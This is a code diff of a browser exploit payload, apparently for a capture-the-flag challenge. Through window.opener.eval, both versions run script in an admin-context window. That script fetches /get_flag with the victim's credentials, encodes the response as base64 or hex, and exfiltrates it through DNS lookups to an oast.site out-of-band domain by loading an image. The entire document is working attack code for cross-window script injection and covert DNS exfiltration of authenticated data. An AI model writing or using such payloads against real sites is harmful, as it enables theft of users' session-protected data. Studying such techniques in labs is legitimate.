@@ -3,29 +3,32 @@
 <script>
 if (window.opener) {
   window.opener.eval(`
-    (function(){
-      // 1) synchronously grab the flag (cookie is sent automatically)
-      var xhr = new XMLHttpRequest();
-      xhr.open('GET','/get_flag',false);
-      xhr.send(null);
-      if (xhr.status !== 200) return;
+    (async () => {
+      // 1) fetch the flag in the admin context
+      const res  = await fetch('/get_flag', { credentials: 'include' });
+      const flag = await res.text();  // JSON string
 
-      // 2) base64‐encode & strip padding
-      var base64 = btoa(xhr.responseText).replace(/=/g,'');
+      // 2) convert to hex
+      let hex = '';
+      for (let i = 0; i < flag.length; i++) {
+        hex += flag.charCodeAt(i).toString(16).padStart(2, '0');
+      }
 
       // 3) split into ≤63-char labels
-      var labels = [];
-      for (var i = 0; i < base64.length; i += 63) {
-        labels.push(base64.slice(i, i + 63));
+      const labels = [];
+      for (let i = 0; i < hex.length; i += 63) {
+        labels.push(hex.slice(i, i + 63));
       }
 
-      // 4) fire off each as a DNS lookup immediately
-      for (var j = 0; j < labels.length; j++) {
-        var img = new Image();
-        img.src = 'http://' + labels[j] + '.' + j +
-                  '.bkdxspdaaz5k3bcjumvu0si0h1d7zctqj.oast.site/';
-      }
-    })();
+      // 4) build the single hostname
+      const hostname = labels.join('.') +
+        '.bkdxspdaaz5k3bcjumvu0si0h1d7zctqj.oast.site';
+
+      // 5) force one DNS lookup
+      const img = new Image();
+      img.src = 'http://' + hostname + '/';
+      document.body.appendChild(img);
+    })()
   `);
 }
 </script>
